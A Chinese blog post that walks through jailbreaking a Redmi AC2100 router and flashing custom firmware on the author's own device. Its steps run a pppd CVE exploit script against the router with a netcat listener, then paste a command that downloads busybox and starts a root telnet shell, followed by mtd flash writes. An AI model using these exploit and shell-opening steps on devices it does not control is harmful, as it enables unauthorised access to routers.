---
title: redmi路由rm2100刷机
date: 2020-05-10 10:31:29
tags:
	- redmi ac2100
	- rm2100
---

最近听说redmi/xiaomi ac2100 路由很火，就入手了一个169的redmi ac2100。到手开箱的时候，第一感觉就是这东西颜值挺低的，外形来看，除了正面，其他三面各配两条天线，据说xiaomi ac2100为了妥协外观去掉了这六根天线。。。

根据恩山论坛大佬的教程折腾了一晚上没成功，主要是卡在了pppoe这一步，路由死活连不上虚拟机的pppoe。具体教程：

1. 准备两条网线，一条短接wan口和旁边的lan口，另一条连接电脑相邻lan口

2. 下载大佬配置好的ubuntu20虚拟机，锁屏密码是739870，里面装好python3环境也搭好pppoe服务了，用vmvare打开虚拟机。

3. 在下载目录（大佬的虚拟机桌面点击haha开头的文件夹一路点到redmi目录）打开命令行窗口，运行

   ```
   python3 -m http.server 8081 &
   ```

    建立http服务器。用手机看看 http://192.168.31.177:8081/ 能否正常打开 ，不能打开就自行检查防火墙，再考虑后面的。这一步一定要在虚拟机检查一下是否能打开192.168.31.1，能进入小米路由管理页面就说明虚拟机和主机网卡桥接成功了。或者说如果你看到路由器的internet指示灯不亮（正常应该是黄色常亮的），那就检查一下网线是否插好，不亮灯肯定是没接上wan口的，多留意细节。

4. 同样在下载目录打开窗口运行下面命令，这是开启pppoe的命令

   ```shell
   sudo pppoe-server -I ens33 -L 192.168.5.1 -R 192.168.5.5 -N 10
   ```

   路由器能拨上号后再考虑后面的。

   再次打开窗口，运行

   ```shell
   nc -nvlp 31337
   ```

   再次打开窗口，运行

   ```shell
   sudo python3 pppd-cve.py 
   ```

   此时注意运行nc-nvlp 31337的窗口，一但收到连接立刻在nc的窗口里复制粘贴运行下面的代码（一定要先运行nc再运行python脚本），这里手速要快点，因为nc连上后会跳出命令。如果连接中途断开，则重复运行上面最后两步（指python和nc-nvlp两个窗口）。

   ```shell
   cd /tmp&&wget http://192.168.31.177:8081/busybox&&chmod a+x ./busybox&&./busybox telnetd -l /bin/sh
   ```

5. 上诉操作完成后运行

   ```shell
   telnet 192.168.31.1
   ```

   再依次运行

   ```shell
   wget http://192.168.31.177:8081/r3g.bin&&nvram set uart_en=1&&nvram set bootdelay=5&&nvram set flag_try_sys1_failed=1&&nvram commit
   ```

   ```shell
   mtd -r write r3g.bin kernel1
   ```

   虽然不太懂这些代码，但大概猜出来是开启路由器telnet的，有了telnet就可以刷入固件了。

6. 运行完成后会进入op(用户名root 密码admin)此时可切换到windows。如果拿不到ip，请手动设置有线网卡ip为192.168.1.23，网关为192.168.1.1，网关掩码255.255.255.0。winscp将老毛子固件传到tmp目录下，用putty之类的连路由器运行下面命令：

  ```
  mtd -r write /tmp/redmi.trx kernel
  ```

  然后等待重启即可，管理后台192.168.2.1 帐号密码：admin admin 或者root admin